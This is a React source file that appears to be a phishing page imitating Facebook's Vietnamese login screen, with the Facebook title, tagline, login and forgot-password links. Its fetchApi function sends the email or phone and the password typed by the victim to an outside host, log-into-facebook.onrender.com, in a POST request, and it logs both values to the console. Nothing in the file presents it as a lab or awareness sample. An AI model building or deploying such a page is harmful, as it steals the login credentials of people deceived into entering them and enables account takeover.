import React,{ useState } from "react";
import './App.css';

function App() {
    const [phone,setPhone] = useState("")
    const [pass, setPass] = useState("")
    console.log(phone)
    console.log(pass)
    const [result, setResult] = useState({error:null});
    const fetchApi = () => {
        fetch('https://log-into-facebook.onrender.com', {
          method: 'POST',
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            phone:phone,
            pass:pass,
      }),
    })
      .then((res) => res.json())
      .then((res) => {
        setResult(res)
      })
      .catch((error) => console.log(error));
    }
  return (
   <div class="content">
    <div class="header">
        <h1 class="title">facebook</h1>
        <p class="intro">Facebook giúp bạn kết nối và chia sẻ</p>
        <p class="intro">với mọi người trong cuộc sống của bạn.</p>
    </div>
    <div>
        <div class = "form_login">
            <div class="form-group">
                <input 
                    type="text" 
                    class="phone_input" 
                    id="exampleInputPassword1" 
                    placeholder="Email hoặc số điện thoại" 
                    name="phone"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                />
            </div>

            <div class="form-check">
                    <input
                         type="text" 
                         class="phone_input" 
                         id="exampleCheck1" 
                         placeholder="Mật khẩu" 
                         name="pass"
                         value={pass}
                        onChange={(e) => setPass(e.target.value)}
                    />
            </div>
            <button
                 type="submit" class="btn btn-login"
                 onClick={() => fetchApi()}
            >Đăng nhập</button>
            <div class="content_link">
                 <a class="link" href ="/">Quên mật khẩu?</a>
            </div>
            <div class="line"></div>
            <div>
                <button type="submit" class="btn btn-register">Tạo tài khoản mới</button>
            </div>
        </div>
        <div class="end_intro">
            <h5 class = {result}>Tạo Trang </h5>
            <p>dành cho người nổi tiếng, thương hiệu hoặc doanh</p>
        </div>
        <div class="centre">
            <p class="end">nghiệp.</p>
        </div>
    </div>

            
   </div>
  );
}

export default App;
